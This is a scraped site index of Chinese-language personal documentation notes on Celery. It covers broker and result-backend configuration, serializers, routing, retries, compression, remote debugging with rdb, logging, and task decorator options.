install celery[redis] 代码里的配置: app.conf.broker_url = 'redis://localhost:6379/0' 此url格式为: redis://:password@hostname:port/db_number 默认使用的是 localhost 的 6379 端口中 0 数据库。（ Redis 默认有 16 个数据库） 可以通过 Uninx 套接字进行连接，URl 格式如下: redis+socket:///path/to/redis.sock 可以通过设置 virtual_host参数添加到URL上进行指定使用时 Uninx 套接字连接的数据库编号: redis+socket:///path/to/redis.sock?virtual_host=db_number Celery 也可以连接 Redis 哨兵也是非常简单的: app.conf.broker_url = 'sentinel://localhost:26379;sentinel://localhost:26380;sentinel://localhost:26381' app.conf.broker_transport_options = {'master_name':'cluster1'}","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-conf_FOR_Redis.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-conf_FOR_Redis.html"},{"title":"配置","text":"支持的一种配置形式: 输入端 -> Broker 输出端 -> 结果后端 支持的配置 task_serializer , 序列化方式 result_serializer 结果后端的序列化方式 timezone, 时区 task_annotations, 详细指定多个任务配置, 如 任务限速 task_routes, 路由 broker_transport_options, 可见性超时 result_backend, 结果后端配置: 返回结果 task_publish_retry, 是否失败重试, 默认为 True task_publish_retry_policy, 失败重试策略 task_compression, 压缩 序列化方式 task_serializer, 默认为json 在客户端和工作人员之间传输的数据需要进行序列化， 因此 Celery 中的每条消息都有一个 content_type 标头， 该标头描述了用于对其进行编码的序列化方法。 默认的序列化器是JSON，但是您可以使用 task_serializer 设置更改此设置，或者针对每个任务，甚至针对每条消息进行更改。 有内置的支持JSON，pickle，YAML 和msgpack 每个序列化器都有其优点和缺点: json - JSON 被大多数的编程语言支持，并且现在是 Python 标准的一部分（自2.6开始）， 并且现代 Python 库（例如 simplejson）具有非常快的 json 解析速度。 JSON 的缺点是会限制你使用如下的数据类型：字符串、Unicode、字典和列表。小数和日期明显缺失。 二进制数据使用 Base64 编码进行传输，这与支持纯二进制传输的相比，数据传输量增长了34%。 但如果你的数据满足上述限制，并且你需要跨语言支持，则 JSON 可能是你的最佳选择。 有关更多信息，请参见 http://json.org pickle - 如果你除了 Python 外，并不需要支持其他语言， 那么使用 pickle 编码将让你获得对所有 Python 内建类型的支持（类实例除外）。 相比 JSON，使用 pickle 序列化的二进制文件更小，传输速度更快。 请参阅 pickle 获得更多信息 yaml - YAML 和 JSON 有许多相似的特征，yaml 支持包括日期、递归引用在内的更多数据类型。 然而，Python 的 YMAL 库相比 JSON 库 要慢很多。 如果你需要更具表现能力的数据集合，则 YMAL 比上面的序列化方式更适合。 有关更多信息，请参见 http://yaml.org/ msgpack - msgpack 是一种接近 JSON 的二进制序列化格式。但是，它还很年轻，因此此时应该将支持视为实验性的 有关更多信息，请参见 http://msgpack.org/ 编码类型可以用作消息头，因此 workers 知道如何反序列化所有的任务。如果你使用自定义序列方案，则该序列化必须被 workers 支持。 发送任务时的序列化配置优先级如下（从高到低）: serializer 执行选项。 Task.serializer 属性。 task_serializer 属性。 为单个任务调用设置序列化方式: >>> add.apply_async((10, 10), serializer='json') 任务限速 任务限速除了: task_annotations = { 'tasks.add': {'rate_limit': '10/m'} } 还可以在启动时设置(仅适用 RabbitMQ 或 Redis): $ celery -A tasks control rate_limit tasks.add 10/m worker@example.com: OK new rate limit set successfully 时区 内部和消息中的所有的时间和日期使用的都是 UTC 时区。 当职程（Worker）收到消息时，例如倒计时设置，会将 UTC 时间转换为本地时间。 如果需要使用与系统不同的时区，可以通过 timezone进行配置: app.conf.timezone = 'Europe/London' 路由 Celery 支持 AMQP 中提供的所有路由，可以将消息发送到指定的任务队列路由。 通过 task_routes 可以设置一个按名称分配的路由任务队列，将所有的内容集中存放在一个位置: app.conf.update( task_routes = { 'proj.tasks.add': {'queue': 'hipri'}, }, ) 可以在程序是使用 queue 参数进行指定队列: >>> from proj.tasks import add >>> add.apply_async((2, 2), queue='hipri') 可以通过设置运行职程（Worker）时指定职程（Worker）从某个队列中进行消费（celery worker -Q）: $ celery -A proj worker -Q hipri 也可以通过\",\"作为分割符进行设置多个队列， 例如，可以将默认队列和 hipri 队列一起通过职程（Worker）进行消费， 其中默认队列 celery 由于历史原因被命名: $ celery -A proj worker -Q hipri,celery 队列名称的顺序不分前后，职程（Worker）给予队列分配的权重是相同的。 相关路由的信息以及使用 AMQP 路由的全部功能，详情请参考路由任务: 官网中文翻译文档-路由 自动路由 最简单的路由方式是使用选项 task_create_missing_queues 进行设置(默认情况下，此设置为打开状态)。 如果启用了该参数，将会自动创建没有在 task_queues 选项中定义的命名队列。这样可以更加容易的执行简单的路由任务。 假如你有两个处理常规任务的服务器 x 和 y ，以及一个只处理与 feed 相关的任务的服务器 z 。那么你可以使用这样的配置: task_routes = {'feed.tasks.import_feed': {'queue': 'feeds'}} 启用这样的路由设置后，import_feed 的任务将会被路由到 feeds 队列中， 而其他的任务将会被路由到默认的队列(因为历史原因被命名为celery)。 另外，你还可以使用通配符，甚至正则表达式来匹配所有在 feed.tasks 命名空间内的所有任务: app.conf.task_routes = {'feed.tasks.*': {'queue': 'feeds'}} 如果匹配模式的顺序很重要，你应该使用列表的方式指定路由的次序: task_routes = ([ ('feed.tasks.*', {'queue': 'feeds'}), ('web.tasks.*', {'queue': 'web'}), (re.compile(r'(video|image)\\.tasks\\..*'), {'queue': 'media'}), ],) 安装完路由之后，你可以按照如下方式启动服务器 z 来只处理 feeds 队列的消息: user@z:/$ celery -A proj worker -Q feeds 你可以指定任意数量的队列，所以你也可以让这个服务器去处理来自默认队列的消息: user@z:/$ celery -A proj worker -Q feeds,celery 修改默认队列的名称 你可以使用如下的配置来修改默认队列的名称: app.conf.task_default_queue = 'default' 定义队列 这部分的特性主要是隐藏复杂的 AMPQ 协议实现，只对用户暴露出需要的基础用法。但是，你可能仍然对队列是如何被声明的原理感兴趣。 使用如下的配置将会创建一个名为 video 的队列: { 'exchange': 'video', 'exchange_type': 'direct', 'routing_key': 'video' } 对于那些非 AMPQ 的后端组件如 Redis 或者 SQS 并不支持交换机，所以他们要求交换机的名称与队列的名称一致。 使用这种设计可以确保正常的处理不同的情况。 手动路由 假设你有两台处理常规任务的服务器，x 和 y，以及另一台只处理与 feed 相关的任务，你可以使用如下的配置: from kombu import Queue app.conf.task_default_queue = 'default' app.conf.task_queues = ( Queue('default', routing_key='task.#'), Queue('feed_tasks', routing_key='feed.#'), ) task_default_exchange = 'tasks' task_default_exchange_type = 'topic' task_default_routing_key = 'task.default' task_queues 是一个包含 Queue 实例的列表。如果你不想指定 exchange 和 exchange_type 的值。 这些变量将会被 task_default_exchange 和 task_default_exchange_type 来设置。 要将一个任务路由到 feed_tasks 队列中，你可以在task_routes配置中添加一个入口: task_routes = { 'feeds.tasks.import_feed': { 'queue': 'feed_tasks', 'routing_key': 'feed.import', }, } 还可以使用 Task.apply_async() 或者 send_task() 中的 routing_key 参数来重载这些设置: >>> from feeds.tasks import import_feed >>> import_feed.apply_async(args=['http://cnn.com/rss'], ... queue='feed_tasks', ... routing_key='feed.import') 要使服务器 z 只处理来自 feed 队列的消息，你可以使用 celery worker -Q 来启动服务: user@z:/$ celery -A proj worker -Q feed_tasks --hostname=z@%h 服务器 x 和 y 需要配置为从默认的队列中消费消息: user@x:/$ celery -A proj worker -Q default --hostname=x@%h user@y:/$ celery -A proj worker -Q default --hostname=y@%h 也可以让 feed 消息的处理职程去处理常规消息，比如在某个时间出现很多任务需要去做: user@z:/$ celery -A proj worker -Q feed_tasks,default --hostname=z@%h 如果你想添加配置了另一个交换机的队列，只需要指定自定义的 exchange 和 exchange_type from kombu import Exchange, Queue app.conf.task_queues = ( Queue('feed_tasks', routing_key='feed.#'), Queue('regular_tasks', routing_key='task.#'), Queue('image_tasks', exchange=Exchange('mediatasks', type='direct'), routing_key='image.compress'), ) 如果你对这些术语感到迷惑，你应该阅读一下 AMPQ. 注解 此处建议看一下: Redis Message Priorities 特殊的路由选项 RabbitMQ 消息优先级 支持的中间人(Broker): RabbitMQ 从 4.0 版本开始引入。 队列可以通过设置 x-max-priority 参数来支持优先级: from kombu import Exchange, Queue app.conf.task_queues = [ Queue('tasks', Exchange('tasks'), routing_key='tasks', queue_arguments={'x-max-priority': 10}), ] 可以通过指定参数 task_default_priority 来设置所有队列的默认最大优先级: app.conf.task_queue_max_priority = 10 可以通过指定参数 task_default_priority 来设置所有任务的默认优先级: app.conf.task_default_priority = 5 Redis 消息优先级 支持的中间人(Broker): Redis 虽然 Celery 的 Redis 中间人(Broker) 支持了优先级的字段，但是 Redis 本身并没有优先级的概念。 所以在尝试使用 Redis 来实现优先级之前，请阅读下方的说明，因为你可能遇到一些意想不到的行为。 优先级的支持是通过为每个队列创建 n 个列表来实现的。 也就是说即使存在 10(0-9) 个优先级别，在默认情况下也会被合并成 4 个级别来节省资源。 也就是说一个名为 celery 的队列将会分成 4 个队列: ['celery0', 'celery3', 'celery6', 'celery9'] 如果你想要更多的优先级别，你可以通过设置中间人(Broker)参数 priority_steps 来实现: app.conf.broker_transport_options = { 'priority_steps': list(range(10)), } 这就是说，要注意到这样的实现永远不如在服务器端实现优先级别，只能近似说是最佳的实现。但是这对于你的应用来说也足够好了。 可见性超时 可见性超时为将消息重新下发给另外一个程序之前等待确认的任务秒数 可以通过 broker_transport_options 选项进行修改: app.conf.broker_transport_options = {'visibility_timeout': 3600} # 一个小时 默认的可见性超时时间为1个小时。 返回结果 如果您想保存任务执行返回结果保存到Redis，您需要进行以下配置: app.conf.result_backend = 'redis://localhost:6379/0' 有关 Redis 保存结果的完整选项列表，请查阅 Redis后端配置。 如果您使用的是 Redis 哨兵默认是，则需要使用 result_backend_transport_options 进行指定 master_name: app.conf.result_backend_transport_options = {'master_name': \"mymaster\"} 注解 可以通过配置 task_ignore_result 来全局禁用结果/返回值 单个禁用直接 @app.task(ignore_result=True) 即可 在调用apply_async和delay执行任务时, 通过传递ignore_result参数, 可以在每次执行的基础上设置开启/禁用任务结果: @app.task def mytask(x, y): return x + y # No result will be stored result = mytask.apply_async(1, 2, ignore_result=True) print result.get() # -> None # Result will be stored result = mytask.apply_async(1, 2, ignore_result=False) print result.get() # -> 3 默认情况下， 当配置了 backend ，任务将不会忽略结果( ignore_result=False ) 选项优先顺序如下(从低到高): 全局选项 task_ignore_result 任务配置 ignore_result 任务执行时选项 ignore_result 失败重试策略 task_publish_retry_policy 支持的键为: max_retries: int = 3 最大重试次数，在这种情况下，将抛出重试失败的异常。 值为None意味着它将永远重试。 interval_start: int = 0 定义两次重试之间要等待的秒数（浮点数或整数）。默认值为0（第一次重试是瞬时的）。 interval_step: float = 0.2 在每次连续重试时，此数字将被添加到重试延迟中（浮点数或整数）。默认值为0.2。 interval_max: float=0.2 重试之间等待的最大秒数（浮点数或整数）。默认值为0.2。 例: add.apply_async((2, 2), retry=True, retry_policy={ 'max_retries': 3, 'interval_start': 0, 'interval_step': 0.2, 'interval_max': 0.2, }) 重试的最长时间为0.4秒。 默认情况下将其设置为相对较短，因为如果代理连接断开，连接失败可能导致重试堆效应– 例如，许多 Web 服务器进程正在等待重试，从而阻止了其他传入请求。 压缩 task_compression Celery 可以使用以下内建方案压缩消息。 brotli bzip2 gzip lzma zlib zstd 你还可以创建自己的压缩方式，并在kumbo压缩注册中注册它们。 发送任务时的压缩方案配置优先级如下（从高到低）: compression 执行选项。 Task.compression 属性。 task_compression 属性。 任务调用时指定压缩方法的示例: >>> add.apply_async((2, 2), compression='zlib') brotli brotli 针对 web 进行了优化，尤其是小型文档。该压缩对诸如字体、html页面等静态内容最有效。 要使用 brotli，请用以下命令进行安装: $ pip install celery[brotli] bzip2 bzip2 创建的文件比 gzip 小，但是压缩和解压的速度明显慢于 gzip。 要使用 bzip2，请确保 bzip2 已经编译到你的 Python 可执行文件中。 如果你得到以下错误 ImportError: >>> import bz2 Traceback (most recent call last): File \"<stdin>\", line 1, in <module> ImportError: No module named 'bz2' 这意味着你应该重新编译支持 bzip2 的 Python 版本。 gzip gzip 适用于内存占用较小的系统，因此 gzip 非常适合内存有限的系统。该压缩常用语生成带有 \".tar.gz\" 后缀的文件。 要使用 gzip，请确保 gzip 已经编译到你的 Python 可执行文件中。 如果你得到以下错误: >>> import gzip Traceback (most recent call last): File \"<stdin>\", line 1, in <module> ImportError: No module named 'gzip' 这意味着你应该重新编译支持 gzip 的 Python 版本。 lzma lzma 具有较好的压缩效率以及压缩解压速度，但内存消耗更大。 要使用 lzma，请确保 gzip 已经编译到你的 Python 可执行文件中，并且你的 Python 版本为3.3或更高版本。 如果你得到以下错误 ImportError: >>> import lzma Traceback (most recent call last): File \"<stdin>\", line 1, in <module> ImportError: No module named 'lzma' 这意味着你应该重新编译支持 lzam 的 Python 版本。 也可以通过以下的方式进行安装: $ pip install celery[lzma] zlib zlib 是 Deflate 算法的抽象，它的 API 支持包括 gzip 格式和轻量级流格式文件的支持。 zlib 是许多软件系统的重要组成部分，例如 Linux 内核以及 Git VCS。 要使用 zlib，请确保 zlib 已经编译到你的 Python 可执行文件中。 如果你得到以下错误 ImportError: >>> import zlib Traceback (most recent call last): File \"<stdin>\", line 1, in <module> ImportError: No module named 'zlib' 这意味着你应该重新编译支持 zlib 的 Python 版本。 zstd zstd是一个针对 zlib 的实时压缩方案，且有着更好的压缩效率。zstd 由 Huff0 和 FSE 库提供快速算法。 要使用zstd，请用以下命令进行安装: $ pip install celery[zstd] 支持的配置方式 硬编码 使用配置文件 硬编码 指定序列化方式为json: app.conf.task_serializer = 'json' 多个配置使用 update: app.conf.update( task_serializer='json', accept_content=['json'], # Ignore other content result_serializer='json', timezone='Europe/Oslo', enable_utc=True, ) 使用配置文件 配置py模块的方式 配置模块例 celeryconfig.py broker_url = 'pyamqp://' result_backend = 'rpc://' task_serializer = 'json' result_serializer = 'json' accept_content = ['json'] timezone = 'Europe/Oslo' enable_utc = True # 其他配置 # 任务执行错误时的专用队列 task_routes = { 'tasks.add': 'low-priority', } # 任务限速, 每分钟内允许执行的10个任务 task_annotations = { 'tasks.add': {'rate_limit': '10/m'} } 配置好后加载配置模块 celeryconfig: app.config_from_object('celeryconfig') 可以通过以下命令来进行验证配置模块是否配置正确: $ python -m celeryconfig 配置py类的方式 可以将其写做一个类: from celery import Celery app = Celery() class Config: enable_utc = True timezone = 'Europe/London' app.config_from_object(Config) # or using the fully qualified name of the object: # app.config_from_object('module:Config') 配置环境变量的方式 还可以将配置文件写入环境变量, 后面直接从环境变量读(app.config_from_envvar): import os from celery import Celery #: Set default configuration module name os.environ.setdefault('CELERY_CONFIG_MODULE', 'celeryconfig') app = Celery() app.config_from_envvar('CELERY_CONFIG_MODULE') 然后通过指定的环境变量进行配置使用的配置模块： $ CELERY_CONFIG_MODULE=\"celeryconfig.prod\" celery worker -l info task_routes涉及到自定义队列处理任务, 详情见: 官网中文翻译文档-路由 部分说明见: 路由 配置的获取/过滤 将配置作为调试信息或类似信息打印出来，那么您也可能希望过滤掉敏感信息，如密码和API密钥。 Celery 提供了集中打印配置信息工具，其中一个为 humanize(): >>> app.conf.humanize(with_defaults=False, censored=True) 该方法将配置信息转换为列表字符串返回，默认情况下，仅包含修改的键值，可以通过 with_defaults 参数进行包含默认的配置信息。 可以通过 table() 方法将返回结果转换为字典: >>> app.conf.table(with_defaults=False, censored=True) 注意：Celery 不会删除所有的敏感配置信息，通过正则表达式来进行检索通常命名的信息， 如果包含敏感信息的自定义配置，Celery 会标识为机密的名称来下进行命名秘钥。 如果命名中含有子字符串，将会进行过滤: API、TOKEN、KEY、SECRET、PASS、SIGNATURE、DATABASE 注意事项 广播前缀 默认情况下，所有的虚拟机都可以看到广播的消息。 您必须为消息进行设置前缀，以便它们由仅活动的虚拟机接收: app.conf.broker_transport_options = {'fanout_prefix': true} 注意：该选项仅是向后兼容的，老版本不支持。集群中所有的职程都必须要开启设置，否则无法进行通信。 该设置在将来以后的版本是默认配置，所以请尽早进行迁移。 广播模式 默认情况下， 职程（Worker）收到所有与任务相关的事件。 为了避免该情况发生，需要进行配置 fanout_patterns 广播模式，以便职程（Worker）只能订阅相关的事件: app.conf.broker_transport_options = {'fanout_patterns': true} 该设置在将来以后的版本是默认配置。 可见性超时-注意 如果在 可见性超时 内没有完成任务，该任务会重新分配给另外一个职程（Worker）进行执行。 这可能会出现在预计时间超出可见性超时时间的问题，如果出现该问题，任务将重新循环执行。 因此您必须要增加可见性超时时间用于用于匹配最长的执行时间。 注意：Celery会在职程（Worker）关闭的重新分配消息，如果可见性超时时间过长在断电或者强制终止职程（Worker）的情况会\"丢失\"重新分配的任务。 定期执行任务不会被可见性超时影响，因为这是俩个不同的概念。 您可以通过配置同名的配置选项来扩增可见性超时时间: app.conf.broker_transport_options = {'visibility_timeout': 432000} 对应的值必须为 int 类型。 驱逐Key 在某些情况下，Redis会根据（驱逐策略）进行驱逐一些key 可能会出现已经错误问题: InconsistencyError: Probably the key ('_kombu.binding.celery') has been removed from the Redis database. 您可以在Redis服务器的 time_out 参数设置为0进行避免key被驱逐。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-conf_celery.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-conf_celery.html"},{"title":"远程调试任务 (使用 pdb)","text":"基本用法 celery.contrib.rdb 是 pdb 的一个扩展版本，可以对没有终端访问权限的进程进行远程调试。 使用示例: from celery import task from celery.contrib import rdb @task() def add(x, y): result = x + y rdb.set_trace() # <- set break-point return result set_trace() 在当前位置设置了一个断点，并创建了一个可以通过 telnet 连接的管道用以调试你的任务。 调试器可能同时由多个进程启动，所以调试器将从基础端口(默认情况下为6900)开始搜索可用的端口，而不是使用一个固定的端口。 基础端口可以通过环境变量 CELERY_RDB_PORT 来进行修改。 默认情况下调试器将只对本机可用，你可以通过 CELERY_RDB_HOST 来设置允许从外界访问调试器。 当职程执行到你指定的断点处时，将会打印如下日志信息: [INFO/MainProcess] Received task: tasks.add[d7261c71-4962-47e5-b342-2448bedd20e8] [WARNING/PoolWorker-1] Remote Debugger:6900: Please telnet 127.0.0.1 6900. Type `exit` in session to continue. [2011-01-18 14:25:44,119: WARNING/PoolWorker-1] Remote Debugger:6900: Waiting for client... 如果你使用 telnet 连接了指定的端口，将会显示一个 pdb 的 shell: $ telnet localhost 6900 Connected to localhost. Escape character is '&#94;]'. > /opt/devel/demoapp/tasks.py(128)add() -> return result (Pdb) 输入 help 可以获取可用的命令列表，如果您之前并没有用过 pdb ，最好先阅读一下文档 Python Debugger Manual 。 为了演示，我们将读取 result 变量的值，对其进行修改之后继续执行任务: (Pdb) result 4 (Pdb) result = 'hello from rdb' (Pdb) continue Connection closed by foreign host. 我们修改的结果将在职程的日志呈现: [2011-01-18 14:35:36,599: INFO/MainProcess] Task tasks.add[d7261c71-4962-47e5-b342-2448bedd20e8] succeeded in 61.481s: 'hello from rdb' 提示 启用断点信号 如果设置了环境变量 CELERY_RDBSIG ，每当收到 SIGUSR2 信号时，就会打开一个 rdb 的实例。主进程和工作进程都是这种情况。 启动职程的示例: $ CELERY_RDBSIG=1 celery worker -l info 你可以通过执行如下命令为任何工作职程启动一个 rdb 的会话: $ kill -USR2 <pid>","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-debug.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-debug.html"},{"title":"celery加载流程与懒加载","text":"程序是懒加载的，在没有实际使用的情况下，是不会进行加载的。 创建一个 Celery 程序的流程如下: 创建用于事件的逻辑时钟实例 创建任务注册表 将自身设置为当前应用程序（如果禁用 set_as_current 参数则不会） 调用 app.on_init() 回调函数(默认情况下不执行任何操作) app.task() 装饰器不会在定义任务时创建任务，创建任务通常在使用该任务或应用程序完成后进行创建。 举例说明，在使用任务或访问属性之前，是如何创建任务的: >>> @app.task >>> def add(x, y): ... return x + y >>> type(add) <class 'celery.local.PromiseProxy'> >>> add.__evaluated__() False >>> add # <-- causes repr(add) to happen <@task: __main__.add> >>> add.__evaluated__() True 应用程序的终结可以通过调用 app.finalize() 显式执行，也可以通过访问 app.tasks 属性隐式执行。 完成创建对象将: 复制必须在应用之间共享的任务 默认情况下共享任务，如果设置装饰器的 shared 参数，该任务为私有任务。 评估所有待处理的任务装饰器 确保当前所有的人呢我都已经绑定到当前应用程序 任务绑带到应用程序，便于从配置中获取配置信息。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-load_celery.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-load_celery.html"},{"title":"日志","text":"celery 提供了自带的日志机制 get_task_logger: from celery.utils.log import get_task_logger logger = get_task_logger(__name__) @app.task def add(x, y): logger.info('Adding {0} + {1}'.format(x, y)) return x + y","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-logging.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-logging.html"},{"title":"优化","text":"默认情况下，默认的配置项没有针对吞吐量进行优化，默认的配置比较合适大量短任务和比较少的长任务。 如果需要优化吞吐量，请参考优化：Optimizing。 中间人 如果使用的中间人是 RabbitMQ，可以将换成 librabbitmq 模块（通过 C 语言实现的AMQP客户端）: $ pip install librabbitmq 任务执行 避免启动同步子任务 让一个任务等待另一个任务的结果往往是非常低效的，并在工作池耗尽时，可能会导致死锁。 建议使您的设计异步化，例如使用回调函数。 例子: # 糟糕的使用 @app.task def update_page_info(url): page = fetch_page.delay(url).get() info = parse_page.delay(url, page).get() store_page_info.delay(url, info) # 较好的使用 def update_page_info(url): # fetch_page -> parse_page -> store_page chain = fetch_page.s(url) | parse_page.s() | store_page_info.s(url) chain() @app.task() def fetch_page(url): return myhttplib.get(url) @app.task() def parse_page(page): return myparser.parse_document(page) @app.task(ignore_result=True) def store_page_info(info, url): PageInfo.objects.create(url=url, info=info) 默认情况下，Celery不允许您在任务中运行同步子任务，但是在极少数或极端情况下您可能需要这么做。 警告 强烈不建议在任务中运行同步子任务。 任务中强制运行同步子任务 @app.task def update_page_info(url): page = fetch_page.delay(url).get(disable_sync_subtasks=False) info = parse_page.delay(url, page).get(disable_sync_subtasks=False) store_page_info.delay(url, info)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-optimization.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-optimization.html"},{"title":"可选安装工具","text":"安装: pip install celery[librabbitmq,redis,auth,msgpack] 中括号中表示可选拓展, 部分拓展说明: librabbitmq 使用 librabbitmq 的 C 库 redis 使用 Redis 作为消息传输方式或结果后端 mongodb 使用 MongoDB 作为消息传输方式（ 实验性 ），或是结果后端（ 已支持 ）。 auth 序列化工具 msgpack 序列化工具 yaml 序列化工具 eventlet 使用 eventlet 池 gevent 使用 gevent 池 threads 使用 线程 池","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-option_install.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-option_install.html"},{"title":"一些问题/报错","text":"Module xxx has no attribute ‘celery‘ 报错大概都是这样: Module xxx has no attribute ‘celery‘ celery 对目录模块啥的要求比较严格, 启动的时候, -A/--app 的参数, 需要明确指定具体的实例化 Celery 的 py 文件 如 app.py: # coding: utf-8 from celery import Celery app = Celery() 所在位置如下: % tree src/time_schedule/app.py src/time_schedule/app.py [error opening dir] 0 directories, 0 files 启动: celery -A time_schedule.app --workdir src worker -l info 使用 time_schedule.app 而不是 time_schedule 说明: celery 默认只寻找 指定模块下的 celery.py , 除非更名 app.py 为 celery.py 否则必须指定具体的 实例化 Celery 的 py 文件","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-some-problems.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-Clery_more-some-problems.html"},{"title":"Celery的Task","text":"参考:: [Celery 中文手册] 任务: Tasks 概念与 异步 的任务类似 基础 使用 task() 装饰器轻松的创建任何可被调用的任务: from .models import User @app.task def create_user(username, password): User.objects.create(username=username, password=password) 支持指定参数: @app.task(serializer='json') def create_user(username, password): User.objects.create(username=username, password=password) 注意, 若存在多个装饰器, app.task 需要放在首位. 还有一个 app.shared_task 待... 一些属性/方法 app.task装饰器支持的参数 name: 任务注册的名称。 可以手动设置任务名称，也可以通过模块名和类名进行自动生成(默认行为)。 backend: 结果后端的实例，用于任务结果后端，默认为 app.backend，可以通过 result_backend 进行配置。 acks_late: 如果设置为 True，任务执行后（而不是执行前，默认为执行前）才会确认该任务的消息。 注意：如果职程（Worker）执行过程中崩溃，任务可能会执行多次。 可以通过 task_acks_late 参数来进行全局配置。 track_started: 如果设置为 True，当职程（Worker）执行任务时，任务状态为 stared。 默认为 False，因为在正常情况下是不需要该颗粒度级别的。 任务要么挂起、完成要么等待重试。 如果有长时间运行的任务，并且需要报告任当任务状态时，stared比较有用。 任务执行的职程（Worker）和进程 id 可以通过状态的元数据中进行查看（例如：result.info['pid']）。 可以通过 task_track_started 进行全局配置。 rate_limit: Union[int, float, None] 配置任务的频率. 限制指定任务类型的速率（限制在指定时间内运行的任务数量）。当速率限制生效时，任务仍然会完成，但是可能需要一些时间才能开始。 如果限制速率为 None，表示速率限制无效. 速率可以为 int 也可以为 float 类型，则被表示为\"每秒任务数\"。 bind: bool=False 为 Trur 时表示设置第一个参数为 self (task实例) serializer: str 设置序列化方式, 会覆盖掉初始配置. 默认为 task_serializer， 也可以为 pickle、json、yaml 或者通过 kombu.serialization.registry 注册的自定义序列化方法。 request: 如果该任务正处于执行状态，该信息包含该任务的请求信息。使用多线程本地存储。 见: request throws: tuple 预期内的异常，如果在元组中含有该异常类，将不会被视为异常。 但是日志会记录到结果后端. time_limit: 该任务的硬时间限制（以秒为单位），如果没有设置职程（Worker）时，使用默认值。 soft_time_limit: 该任务的软时间限制（以秒为单位），如果没有设置职程（Worker）时，使用默认值。 ignore_result: 不存储任务状态信息，如果配置该选项 AsyncResult 将失效，无法进行检测任务情况以及返回内容。 如果你并不关心任务的结果，请务必确定设置 ignore_result 选项，因为存储结果会浪费时间和资源。 store_errors_even_if_ignored: 如果设置为 True ，即使任务被忽略，也会存储错误信息。 compression: 标识需要使用默认压缩方法的字符串。 默认为 task_compression，可以设置为 gzip、bzip2或通过 kombu.compression 注册的自定义压缩方案。 max_retries: int = 3 当前任务调用 self 或使用 autoretry_for 参数时才会启用。 如果重试的次数超过最大限制，会引发 MaxRetriesExceededError 异常。在异常时不会自动重试，所以必须手动调用 retry()。 默认值重试次数为3次，如果设置为 None 会关闭重试限制，直到任务执行成功为止。 速率限制也可以在数值后面添加 \"/s\"、\"/m\" 或 \"/h\"，以秒、分钟或以小时为单位。任务将在指定的时间内平均分配。 例如: \"100/m\" （每分钟100个任务）。则强制会在同一个职程（Worker）实例上启动俩个任务之间至少 600ms 的延迟。 默认值通过 task_default_rate_limit 进行设定：如果未指定，表示默认情况禁用任务的速率限制。 注意，该速率限制为每一个职程（Worker）实例的限制，并非全局速率限制。配置全局速率限制（例如，API每秒最多请求的次数），必须制定队列。 default_retry_delay: Union[int, float] = 30 * 60 如果任务需要重试, 设置每次重试之间的间隔时间. 单位: 秒(s) autoretry_for: 任务失败时重试, 相关的配置. 异常类的列表或元组，如果任务在执行的过程中引发异常，任务将自动重试。默认情况下不会自动重试任何异常。 见 autoretry_for retry_kwargs: dict 任务失败重试时相关配置. 自定义配置自动重试参数。 注意，如果使用下面的 exponential backoff 选项是， countdown 任务选项将由 Celery 的自动重试系统决定，字典中包含 countdown 会被忽略。 见 retry_kwargs retry_backoff: Union[int, bool] = False 如果将此选项设置为True，则自动重试将按照 exponential backoff 规则延迟。 第一次重试延迟 1 秒，第二次重试延迟 2 秒，第三次延迟 4 秒，第四次延迟 8 秒，以此类推。 （如果启用了 retry_jitter 会修改延迟值）。 如果该选项设置为数字，则作为延迟因子. 例如，该选项设置为 3，那么第一次重试将延迟 3 秒，第二次将延迟 6 秒，第三次延迟 12 秒，第四次延迟 24秒，以此类推。 默认情况下，该选项设置为 False，自动重试不会延迟。 retry_backoff_max: int = 600 如果启动了 retry_backoff，该选项在任务自动重试之间设置以秒为单位的最大延迟。 默认情况，该选项默认值为 600，即 10分钟。 retry_jitter: bool = True Jitter 用于随机性引入指数回退延迟，防止队列中所有任务同时执行. 如果该选项设置为 True，则将 retry_backoff 计算的延迟作为最大值，实际的延迟值为一个介于 0 和最大值之间的一个随机数。 retry 任务失败时的重试 当调用 retry 时，会发送与原始任务相同的ID发送一条消息，将该消息发送到原始任务的对列中。 当任务被重试时，也会被记录为一个任务状态，便于通过 result 实例来跟踪任务。 例: @app.task(bind=True) def send_twitter_status(self, oauth, tweet): try: twitter = Twitter(oauth) twitter.update_status(tweet) except (Twitter.FailWhaleError, Twitter.LoginError) as exc: raise self.retry(exc=exc) exc 参数主要用传递日志和存储任务结果时的使用的异常信息。exception 和 traceback 都将在任务状态中可用(如果启用了结果后端)。 任务如果有一个 max_retries 值，超出了重试的最大次数，则会重新引发当前的异常信息，但如果: exc 参数没有设置 该情况会引发 MaxRetriesExceededError 异常 没有异常 如果没有初始异常来重新引发exc参数，可以使用: self.retry(exc=Twitter.LoginError()) 设置 exc 参数值 request 任务请求：Task Request app.Task.request 包含与当前执行任务相关的信息和状态。 该请求定义了以下属性: 属性名称 说明 id 执行任务的唯一ID group 任务组的唯一ID（该任务是组成员的情况下） chord 此任务所属的和弦的惟一id(如果该任务是标题的一部分) correlation_id 用于重复数据删除的自定义ID args 选项参数 kwargs 关键字参数 origin 发送任务的主机名 retries 任务重试次数，默认是从 0 开始的 is_eager 如果任务是由客户端执行，并非职程（Worker）执行，设置 True expires 任务预计时间（如果已经设置的情况下），时间为 UTC 格式（取决于 enable_utc 设置） hostname 执行任务的职程（Worker）实例的节点名 